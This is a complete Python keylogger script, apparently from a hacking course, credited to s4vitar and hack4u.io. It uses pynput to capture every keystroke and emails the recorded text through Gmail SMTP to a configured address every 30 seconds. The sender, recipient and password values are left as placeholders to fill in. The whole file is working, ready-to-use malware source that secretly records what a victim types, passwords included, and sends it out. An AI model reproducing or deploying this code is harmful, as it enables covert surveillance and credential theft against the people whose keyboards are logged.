# Credits for s4vitar in https://hack4u.io
#!/usr/bin/env python3

import threading
import smtplib
import signal
import sys
from email.mime.text import MIMEText
from pynput import keyboard

# Email settings # Change to your email and key created
SENDER_EMAIL = "changethis@gmail.com" # Change
RECIPIENT_EMAIL = ["changethis@gmail.com"] # Change
EMAIL_PASSWORD = "xxxx xxxx xxxx xxxx" # Change
EMAIL_SUBJECT = "Keylogger report"
EMAIL_BODY_START = "[+] Keylogger has been successfully started"

# Global variables
record = ""
stop_request = False
timer = None
initial_execution = True

# Function to exit   Ctrl + C
def def_handler(sig, frame):
    print(f"\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Function to register the key pressed
def push_key(key):

    global record
    try:
        record += str(key.char)
    except AttributeError:
        special_keys = {

            keyboard.Key.space: " ",
            keyboard.Key.backspace: " Backspace ",
            keyboard.Key.enter: " Enter ",
            keyboard.Key.tab: " Tab ",
            keyboard.Key.shift: " Shift ",
            keyboard.Key.alt: " Alt ",
            keyboard.Key.ctrl: " Ctrl ",
            keyboard.Key.esc: " Esc ",
            keyboard.Key.cmd: " Cmd ",

        }
        record += special_keys.get(key, f" {str(key)} ")

# Function to send an email
def send_email(subject, body):
    
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = SENDER_EMAIL
    msg['To'] = ', '.join(RECIPIENT_EMAIL)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(SENDER_EMAIL, EMAIL_PASSWORD)
        smtp_server.sendmail(SENDER_EMAIL, RECIPIENT_EMAIL, msg.as_string())

# Function to generate the report and send it via email
def report():

    global record, initial_execution, timer
    email_body = EMAIL_BODY_START if initial_execution else record
    send_email(EMAIL_SUBJECT, email_body)
    record = ""
    if initial_execution:
        initial_execution = False
    if not stop_request:
        timer = threading.Timer(30, report)
        timer.start()

# Function to shut down the keylogger
def sleep_keylogger():

    global stop_request, timer
    stop_request = True
    if timer:
        timer.cancel()

# Function to start the keylogger
def start_keylogger():

    keyboard_listener = keyboard.Listener(on_press=push_key)
    with keyboard_listener:
        report()
        keyboard_listener.join()

if __name__ == "__main__":
    start_keylogger()
